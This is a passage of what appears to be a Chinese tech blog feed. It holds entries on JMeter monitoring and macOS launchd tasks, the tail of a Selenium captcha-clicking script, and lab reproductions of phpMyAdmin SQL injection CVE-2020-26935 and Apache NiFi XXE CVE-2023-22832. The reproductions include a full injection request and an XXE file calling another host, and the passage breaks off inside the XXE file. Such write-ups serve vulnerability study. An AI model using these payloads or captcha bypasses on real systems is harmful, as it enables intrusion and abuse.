[[x1,y1],[x2,y2]]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;|&#x27;</span> in result:    list_1 = result.<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>)    count_1 = <span class="hljs-built_in">len</span>(list_1)    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(count_1):        xy_list = []        <span class="hljs-keyword">x</span> = <span class="hljs-keyword">int</span>(list_1[i].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">0</span>])        <span class="hljs-keyword">y</span> = <span class="hljs-keyword">int</span>(list_1[i].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>])        xy_list.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">x</span>)        xy_list.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">y</span>)        all_list.<span class="hljs-keyword">append</span>(xy_list)<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">x</span> = <span class="hljs-keyword">int</span>(result.<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">0</span>])    <span class="hljs-keyword">y</span> = <span class="hljs-keyword">int</span>(result.<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>])    xy_list = []    xy_list.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">x</span>)    xy_list.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">y</span>)    all_list.<span class="hljs-keyword">append</span>(xy_list)# 遍历列表，使用动作链对每一个列表元素对应的<span class="hljs-keyword">x</span>,<span class="hljs-keyword">y</span>指定的位置进行点击操作# <span class="hljs-keyword">x</span>,<span class="hljs-keyword">y</span>坐标乘<span class="hljs-number">2</span>和<span class="hljs-number">0.8</span>，是由于<span class="hljs-keyword">for</span> <span class="hljs-keyword">l</span> in all_list:    <span class="hljs-keyword">x</span> = <span class="hljs-keyword">l</span>[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> * <span class="hljs-number">0.8</span>    <span class="hljs-keyword">y</span> = <span class="hljs-keyword">l</span>[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span> * <span class="hljs-number">0.8</span>    # 将点击操作的参照物移动到指定的模块，    # 若用方法二获取的验证码图片，要添加下面代码对code_img_ele赋值    # code_img_ele = <span class="hljs-keyword">bro</span>.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[2]/div[2]/div[6]/div/div/div[2]/div[1]/div/div[2]/img&#x27;</span>)    ActionChains(driver).move_to_element_with_offset(code_img_ele, <span class="hljs-keyword">x</span>, <span class="hljs-keyword">y</span>).click().perform()    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;点击已完成&#x27;</span>)# 完成动作链点击操作后，定位确认按钮并点击driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[2]/div[2]/div[6]/div/div/div[3]/a&#x27;</span>).click()</code></pre></div><h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p>由于验证码处理需要用到第三方平台，外加设置了强制等待，整体运行速度较慢。<br/><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/029014d9830d498daf682b1d6d9c7061.gif"></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jmeter</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Jmeter/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Jmeter/</url>
    
    <content type="html"><![CDATA[<h1 id="使用Jmeter的PerfMon插件实时监控服务器性能"><a href="#使用Jmeter的PerfMon插件实时监控服务器性能" class="headerlink" title="使用Jmeter的PerfMon插件实时监控服务器性能"></a>使用Jmeter的PerfMon插件实时监控服务器性能</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工作上偶然参与到一个性能测试的任务，需要测试开启产品某个功能后对服务器的各项性能指标的影响，于是搜索相关资料，比较常用的是Jmeter方案：大致是在被监控的服务器上启动一个性能监控的Agent，然后使用Jmeter的PerfMon插件接受收集的数据并且可以形成图表数据。</p><h1 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h1><p><strong>版本信息</strong></p><p>Windows10 + JDK：1.8.0_65</p><p>Apache Jmeter：5.6.3</p><p>Jmeter Plugin：1.10</p><p>Server Agent：2.2.3</p><p><strong>下载地址</strong></p><p><a href="https://jmeter.apache.org/download_jmeter.cgi">https://jmeter.apache.org/download_jmeter.cgi</a></p><p><a href="https://github.com/undera/perfmon-agent">https://github.com/undera/perfmon-agent</a></p><p><a href="https://jmeter-plugins.org/get/">https://jmeter-plugins.org/get/</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装Apache-Jmeter"><a href="#安装Apache-Jmeter" class="headerlink" title="安装Apache Jmeter"></a>安装Apache Jmeter</h2><p>解压apache-jmeter-5.6.3.zip后运行<code>bin\jmeter.bat</code>脚本</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318215202017.png"></p><h2 id="安装Jmeter-Plugin"><a href="#安装Jmeter-Plugin" class="headerlink" title="安装Jmeter Plugin"></a>安装Jmeter Plugin</h2><p>下载<code>jmeter-plugins-manager-1.10.jar</code>后将其放至jmeter的<code>lib\ext</code>目录下</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318215556901.png"></p><p>重新启动Jmeter，在<code>Options</code>菜单栏中出现<code>Plugins Manager</code>即成功加载</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318215718213.png"></p><h2 id="安装Perfmon插件"><a href="#安装Perfmon插件" class="headerlink" title="安装Perfmon插件"></a>安装Perfmon插件</h2><p>在<code>Plugins Manager</code>的<code>Available Plugins</code>中搜索<code>Perfmon</code>，勾选插件，点击右下角的<code>Apply Changes and Restart JMeter</code>，即开始自动下载<code>Perfmon</code>插件的包</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318220017745.png"></p><p>重新启动后在<code>Installed Plugins</code>可查看到<code>PerfMon</code>插件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318220226706.png"></p><h2 id="安装Server-Agent"><a href="#安装Server-Agent" class="headerlink" title="安装Server Agent"></a>安装Server Agent</h2><p>将下载的<code>ServerAgent-2.2.3.zip</code>上传到需要被监控性能的服务器上，解压缩包，运行以下命令启动agent</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ServerAgent-2.2.3./startAgent.sh</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318220454637.png"></p><p>默认监听TCP&#x2F;UDP的4444端口，使用<code>--tcp-port</code>和<code>--udp-port</code>参数可更改监听端口</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318220623524.png"></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="创建线程组"><a href="#创建线程组" class="headerlink" title="创建线程组"></a>创建线程组</h2><p>在Test Plan中创建一个线程组</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318220905505.png"></p><p>循环次数选择永远循环</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221036506.png"></p><h2 id="创建Sampler"><a href="#创建Sampler" class="headerlink" title="创建Sampler"></a>创建Sampler</h2><p>在线程组中创建一个Sampler，随意选择即可，不用配置任何参数</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221125388.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221212255.png"></p><h2 id="创建Listener"><a href="#创建Listener" class="headerlink" title="创建Listener"></a>创建Listener</h2><p>在线程组中创建Listener，选择<code>PerfMon Mertrics Collector</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221232684.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221415301.png"></p><h2 id="添加监控的指标"><a href="#添加监控的指标" class="headerlink" title="添加监控的指标"></a>添加监控的指标</h2><p>点击Add Row，添加监控行，填写被监控的服务器IP，端口，监控项</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221529412.png"></p><p>在下方可配置文件路径，将监控的数据写入文件中，支持的文件格式有<code>.xml</code>、<code>.jtl</code>和<code>.csv</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221842571.png"></p><h2 id="运行线程组"><a href="#运行线程组" class="headerlink" title="运行线程组"></a>运行线程组</h2><p>光标选择<code>Thread Group</code>，点击运行按钮</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221658433.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318221738399.png"></p><p>在PerfMon中即可查看到监控项的图表数据</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318222223504.png"></p><p>Server Agent端也收到请求记录</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318222210711.png"></p><p>监控数据也写入到文件中</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318222258952.png"></p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><ol><li>将Jmeter Plugin放在lib\ext目录后启动Jmeter进入Plugin Manager报错</li></ol><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240318222738838.png"></p><p> 解决方法参考：<a href="https://www.cnblogs.com/yoyoketang/p/14180667.html">https://www.cnblogs.com/yoyoketang/p/14180667.html</a></p><p>问题原因为：Jmeter程序需要连接Jmeter插件的https网站，而本地JDK没有信任https网站的证书，需要手动将网站证书添加到jre环境中</p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Jmeter</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Jmeter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>添加定时任务</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/MacOS/Mac%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/MacOS/Mac%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要在mac上添加一个定时任务。第一想到的是使用<code>crontab</code>，后续发现当mac进入休眠模式后crontab的定时任务无法执行，后续确定原因是使用<code>crontab -e</code>创建 了用户级别的任务，当mac进入休眠模式后会暂停系统上的用户级任务，所以才没有执行。</p><h1 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h1><p><strong>系统级定时任务</strong></p><div class="code-wrapper"><pre><code class="hljs gauss">/<span class="hljs-keyword">System</span>/<span class="hljs-keyword">Library</span>/LaunchDaemons 不用登陆也要运行,Apple 提供的系统守护进程/<span class="hljs-keyword">System</span>/<span class="hljs-keyword">Library</span>/LaunchAgents Apple提供的代理，适用于每个用户的所有用户/<span class="hljs-keyword">Library</span>/LaunchDaemons 不用登陆也要运行，第三方系统守护进程/<span class="hljs-keyword">Library</span>/LaunchAgents  需要root登录并且配置文件归root所有</code></pre></div><p><strong>用户级定时任务</strong></p><div class="code-wrapper"><pre><code class="hljs xquery">~/Library/LaunchAgents 需要<span class="hljs-built_in">非root</span>登录，并且配置文件归<span class="hljs-built_in">非root</span>所有</code></pre></div><p>在对应文件夹下创建<code>plist</code>文件</p><p>com.pacemrc.douyin-downloader.plist</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">plist</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="hljs-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.pacemrc.douyin-downloader<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 任务的名称 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>ProgramArguments<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 程序执行参数 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/Library/Frameworks/Python.framework/Versions/3.12/bin/python3<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/Users/pacemrc/PycharmProjects/douyin-downloader/DouYinCommand.py<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StartCalendarInterval<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 每天23:55分执行 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>23<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>55<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><span class="hljs-comment">&lt;!-- 设置输出日志 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StandardOutPath<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/Users/pacemrc/tmp/douyin-downloader.out<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StandardErrorPath<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/Users/pacemrc/tmp/douyin-downloader.err<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span></code></pre></div><p>修改文件权限</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> -R root:wheel /Library/LaunchDaemons/com.pacemrc.douyin-downloader.plist</code></pre></div><p>卸载任务</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> launchctl bootout system /Library/LaunchDaemons/com.pacemrc.douyin-downloader.plist</code></pre></div><p>加载任务</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> launchctl bootstrap system /Library/LaunchDaemons/com.pacemrc.douyin-downloader.plist</code></pre></div><p>查看任务详情</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> launchctl <span class="hljs-built_in">print</span> system/com.pacemrc.douyin-downloader</code></pre></div><p>立即执行定时任务</p><div class="code-wrapper"><pre><code class="hljs vim">launchctl kickstart -<span class="hljs-keyword">k</span> <span class="hljs-built_in">system</span>/<span class="hljs-keyword">com</span>.pacemrc.douyin-downloader</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>MacOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpMyAdmin SQL注入漏洞-CVE-2020-26935</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpMyAdmin-cve-2020-26935/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpMyAdmin-cve-2020-26935/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>软件列表</strong></p><p>Windows、phpstudy、phpMyAdmin</p><p><strong>软件版本</strong></p><p>Windows：Windows server2012 R2</p><p>phpstudy：windows-phpstudy</p><p>phpmyadmin：5.0.2</p><p><strong>软件下载</strong></p><p>phpstudy：</p><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p>phpMyAdmin：</p><p><a href="https://files.phpmyadmin.net/phpMyAdmin/5.0.2/phpMyAdmin-5.0.2-all-languages.zip">https://files.phpmyadmin.net/phpMyAdmin/5.0.2/phpMyAdmin-5.0.2-all-languages.zip</a></p><h2 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h2><h2 id="安装phpMyAdmin"><a href="#安装phpMyAdmin" class="headerlink" title="安装phpMyAdmin"></a>安装phpMyAdmin</h2><p><strong>安装</strong></p><p>将phpMyAdmin-5.0.2-all-languages.zip解压至C:\phpstudy_pro\WWW目录并重命名为phpMyAdmin</p><p><strong>启动</strong></p><p>启动phpstudy的apache和mysql服务</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="http://10.41.230.111/phpMyAdmin">http://10.41.230.111/phpMyAdmin</a></p><p>用户名：root</p><p>密码：root</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在phpMyAdmin如何处理搜索功能中的SQL语句中发现了一个SQL注入漏洞。攻击者可以利用此漏洞将恶意SQL注入查询。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>phpmyadmin &lt; &#x3D; 4.9.6</p><p>phpMyAdmin &#x3D; 4.9.</p><p>phpmyadmin &lt; &#x3D; 5.0.3 5.0.x</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>中危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>登陆<a href="http://10.41.230.111/phpMyAdmin">http://10.41.230.111/phpMyAdmin</a>    root&#x2F;root</p><p>登陆后使用burpsuite代理发包，替换poc中的cookie和token字段发包</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/phpMyAdmin/tbl_zoom_select.php</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>144<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>null<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>pma_lang=zh_CN; phpMyAdmin=usa0oigh07dp8k5qv360i75dk9; pmaUser-1=%7B%22iv%22%3A%22uICKsLNqBgmLHol%5C%2FC7afvQ%3D%3D%22%2C%22mac%22%3A%2295061df17f777a604eff52a16895f350ccea9294%22%2C%22payload%22%3A%22BU00VBrmp9wfN5VicDqKEg%3D%3D%22%7D; pmaAuth-1=%7B%22iv%22%3A%22TdeksNSDXVEhwjYbYHoBuA%3D%3D%22%2C%22mac%22%3A%229168b1746027d3f2f88f3d2a91691ba037936f11%22%2C%22payload%22%3A%22dvX9ScYtOE3DiUwnM%5C%2FSZ0PJTJnf9j%2BbVlM1GfS88Wy0%3D%22%7D; login_locale=zh_CN; avatarImageUrl=-1084887632049975838<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-apache"><span class="hljs-attribute">db</span>=information_schema&amp;table=CHARACTER_SETS&amp;token=<span class="hljs-number">762529653</span>d792f6e446a355d56212978&amp;get_data_row=<span class="hljs-number">1</span>&amp;where_clause=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,user()),<span class="hljs-number">1</span>)</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240311164715768.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache NiFi XML 外部实体注入漏洞-CVE-2023-22832</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nifi-cve-2023-22832/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nifi-cve-2023-22832/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>测试版本</strong></p><p>Java：jdk-17.0.1</p><p>Apache NiFi：1.19.1</p><p><strong>软件下载</strong></p><p><strong>java</strong></p><p><strong>Apache NiFi</strong></p><p><a href="http://archive.apache.org/dist/nifi/1.19.1/nifi-1.19.1-bin.zip">http://archive.apache.org/dist/nifi/1.19.1/nifi-1.19.1-bin.zip</a></p><h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><p>JDK17</p><h2 id="安装Apache-NiFi"><a href="#安装Apache-NiFi" class="headerlink" title="安装Apache NiFi"></a>安装Apache NiFi</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#解压安装</span><span class="hljs-attribute">unzip</span> nifi-<span class="hljs-number">1</span>.<span class="hljs-number">19</span>.<span class="hljs-number">1</span>-bin.zip</code></pre></div><p><strong>配置</strong></p><p>vim conf&#x2F;nifi.properties</p><div class="code-wrapper"><pre><code class="hljs routeros">将nifi.web.https.<span class="hljs-attribute">host</span>=127.0.0.1修改为nifi.web.https.<span class="hljs-attribute">host</span>=10.41.230.69</code></pre></div><p>设置管理员用户</p><div class="code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">bash</span> <span class="hljs-string">bin</span>/<span class="hljs-string">nifi</span>.<span class="hljs-string">sh</span> <span class="hljs-built_in">set-single-user-credentials</span> <span class="hljs-string">admin</span> <span class="hljs-string">admin</span>@<span class="hljs-string">123456</span></code></pre></div><p><strong>启动</strong></p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bash </span><span class="hljs-keyword">bin/nifi.sh </span>start</code></pre></div><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="https://10.41.230.69:8443/nifi/">https://10.41.230.69:8443/nifi/</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230409175502513.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>Apache NiFi 1.2.0到1.19.1中的ExtractCCDAttributes处理器不限制XML外部实体引用。包含ExtractCCDAttributes处理器的流配置容易受到包含带有XML外部实体引用的文档类型声明的恶意XML文档的攻击。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>1.2.0 &lt;&#x3D; Apache NiFi &lt;&#x3D; 1.19.1</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>登陆到NiFi</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410101927656.png"></p><h3 id="添加GetFile处理器"><a href="#添加GetFile处理器" class="headerlink" title="添加GetFile处理器"></a>添加GetFile处理器</h3><p>鼠标悬浮到Processor上，拖拽至右下方面板，在弹出的页面的搜索框中输入GetFile过滤出GetFile处理器，点击ADD添加</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102145024.png"></p><p>在GetFile处理器上鼠标右击，点击Configure</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102315404.png"></p><p>进入到Properites选项，填写Input Directory属性值，再点击APPLY</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102424052.png"></p><h3 id="添加ExtractCCDAttributes处理器"><a href="#添加ExtractCCDAttributes处理器" class="headerlink" title="添加ExtractCCDAttributes处理器"></a>添加ExtractCCDAttributes处理器</h3><p>鼠标悬浮到Processor上，拖拽至右下方面板，在弹出的页面的搜索框中输入ExtractCCDAAttributes过滤出ExtractCCDAAttributes处理器，点击ADD添加</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102743945.png"></p><p>在ExtractCCDAAttributes处理器上鼠标右击，点击Configure</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102820961.png"></p><p>进入RELATIONSHIPS选项，将failure和success的terminate框勾选，再点击APPLY</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102844873.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410102948491.png"></p><h3 id="连接两个处理器"><a href="#连接两个处理器" class="headerlink" title="连接两个处理器"></a>连接两个处理器</h3><p>鼠标悬浮到GetFile处理器上，出现一个箭头，将箭头拖拽至ExtractCCDAAttributes处理器上，创建连接关系</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103057425.png"></p><p>自动弹出创建框，点击ADD即可</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103124113.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103137710.png"></p><h3 id="配置漏洞环境"><a href="#配置漏洞环境" class="headerlink" title="配置漏洞环境"></a>配置漏洞环境</h3><p>在NIFI服务器上，创建GetFile处理器中指定的Input Directory目录，本例为【&#x2F;root&#x2F;xml】，并将poc.xml文件放至该目录</p><p>poc.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span></span><span class="hljs-meta">        [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;&lt;http://10.41.230.66:8000&gt;&quot;</span> &gt;</span>]</span><span class="hljs-meta">        &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span 